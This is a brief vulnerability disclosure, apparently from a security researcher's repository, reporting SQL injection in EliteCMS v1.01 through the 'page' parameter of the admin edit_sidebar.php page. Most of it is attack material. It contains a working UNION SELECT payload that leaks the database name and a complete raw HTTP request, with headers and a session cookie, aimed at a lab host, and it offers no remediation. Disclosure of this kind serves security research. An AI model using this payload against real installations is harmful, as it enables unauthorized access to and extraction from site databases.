# Elitecms v1.01 by elitecms has SQL injection

vendors: https://elitecms.net/download.php

Vulnerability File: /admin/edit_sidebar.php

Vulnerability location: ip/eliteCMS1.01/admin/edit_sidebar.php?page=, page

dbname: elitecms101

[+] Payload: /eliteCMS1.01/admin/edit_sidebar.php?page=-1%20union%20select%201,2,3,4,database(),6,7,8,9,10,11--+&sidebar=1 // Leak place ---> page

```sql
GET /eliteCMS1.01/admin/edit_sidebar.php?page=-1%20union%20select%201,2,3,4,database(),6,7,8,9,10,11--+&sidebar=1 HTTP/1.1
Host: 192.168.1.108
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=307ef75a2f3ab4c1103d8a1e90cf120e
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167535779-a0eef3fa-47e6-438e-a850-2ac4169f203e.png)

![image](https://user-images.githubusercontent.com/54017627/167535807-1c047609-4a23-4ef6-ad53-0270f489b7bf.png)

